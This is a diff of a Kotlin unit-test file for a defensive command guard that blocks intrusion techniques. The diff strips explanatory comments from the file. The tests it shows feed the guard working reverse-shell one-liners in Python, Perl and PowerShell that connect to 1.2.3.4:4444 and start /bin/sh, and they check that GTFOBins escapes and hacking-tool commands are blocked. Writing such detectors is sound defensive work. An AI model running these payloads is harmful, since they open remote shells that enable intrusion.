@@ -6,14 +6,6 @@ import org.junit.jupiter.api.Assertions.assertEquals
 import org.junit.jupiter.api.Assertions.assertNotEquals
 import org.junit.jupiter.api.Test
 
-/**
- * The [SecurityCategory.INTRUSION_TECHNIQUE] family — a DEFENSIVE detector, so it is held to the guard's own two
- * bars: every positive is blocked **by the rule that owns the vector** (not merely blocked), and every dual-use
- * counterpart keeps running (a detector that stops ordinary work is uninstalled, and then it protects nobody).
- *
- * The reverse-shell and GTFOBins corpora lean SHAPE-first on purpose: an attacker writes the payload in whatever
- * language is on the box, so what is tested is that the structure is recognised, not one blessed spelling.
- */
 class IntrusionTechniqueTest {
 
     private val policy = SensitiveGuard.Policy(
@@ -32,12 +24,9 @@ class IntrusionTechniqueTest {
         assertEquals(rule, ruleFor(it), "'$it' tripped the wrong rule")
     }
 
-    /** Not blocked BY this family — a different rule is allowed to fire, ALLOW is allowed, only this must not own it. */
     private fun notFlaggedAs(rule: SecurityRule, vararg commands: String) = commands.forEach {
         assertNotEquals(rule, ruleFor(it), it)
     }
-
-    // ── known intrusion tooling ────────────────────────────────────────────────────────────────────────────
 
     @Test
     fun `named intrusion tools are blocked as HACKING_TOOL, across the kill chain`() {
@@ -72,7 +61,6 @@ class IntrusionTechniqueTest {
 
     @Test
     fun `a tool NAME merely mentioned, not run, is not flagged`() {
-        // The anchoring that keeps this rule usable: a commit message, a filename, a path fragment.
         notFlaggedAs(
             SecurityRule.HACKING_TOOL,
             "git commit -m 'add nmap output parser'",
@@ -82,13 +70,8 @@ class IntrusionTechniqueTest {
         )
     }
 
-    // ── reverse and bind shells, by shape ───────────────────────────────────────────────────────────────────
-
     @Test
     fun `reverse shells are caught whatever language carries them`() {
-        // Some of these ALSO trip SYSTEM_DEVICE (/dev/tcp) — severity ordering may name that instead, which is a
-        // stronger claim, so those are asserted as "not ALLOW" rather than as a specific rule. The interpreter
-        // one-liners name no device and are the ones REVERSE_SHELL exists for.
         listOf(
             "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'",
             "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);exec(\"/bin/sh -i\");'",
@@ -100,7 +83,6 @@ class IntrusionTechniqueTest {
         ).forEach {
             assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdictFor(it), it)
         }
-        // The PowerShell TCP-client shell names no device — REVERSE_SHELL is the only thing that can catch it.
         blockedBy(
             SecurityRule.REVERSE_SHELL,
             "powershell -c \"\$c=New-Object System.Net.Sockets.TCPClient('1.2.3.4',4444)\"",
@@ -119,8 +101,6 @@ class IntrusionTechniqueTest {
         )
     }
 
-    // ── GTFOBins escapes and privilege escalation ───────────────────────────────────────────────────────────
-
     @Test
     fun `GTFOBins shell escapes are caught`() {
         blockedBy(
@@ -138,7 +118,6 @@ class IntrusionTechniqueTest {
 
     @Test
     fun `ordinary use of those same binaries keeps working`() {
-        // The dual-use floor, asserted. Every one of these is routine and must NOT be flagged as a privesc escape.
         notFlaggedAs(
             SecurityRule.PRIVESC_EXEC,
             "find . -name '*.kt' -exec grep -l TODO {} \\;",
